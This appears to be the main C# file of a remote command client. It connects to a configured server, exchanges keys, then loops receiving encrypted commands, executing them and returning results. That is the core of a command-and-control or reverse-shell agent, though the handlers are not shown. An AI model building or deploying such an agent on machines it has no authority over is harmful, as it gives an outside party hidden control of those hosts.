using Client_side;
using System.Net.Sockets;

public class Program
{
    public static Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    
    public static void Main()
    {
        // Connect to the server and send the public key
        NetworkLayer.Connect(Utils.IP, Utils.PORT);
        NetworkLayer.SendPublicKey();
        string passPhrase = NetworkLayer.ReceivePassPhrase();
        Encryptor encryptor = new(passPhrase.Trim());

        // Loop to receive commands from the server and execute them then send the result back
        while (true)
        {
            try
            {
                byte[] command = NetworkLayer.ReceiveCommand();
                string decryptedCommand = encryptor.Decrypt(command);
                HandleCommand.ProcessCommand(decryptedCommand, encryptor);
            }
            catch (SocketException)
            {
                break;
            }
            catch (Exception e)
            {
                NetworkLayer.SendResult(e.Message);
            }
        }
        Environment.Exit(0);
    }
}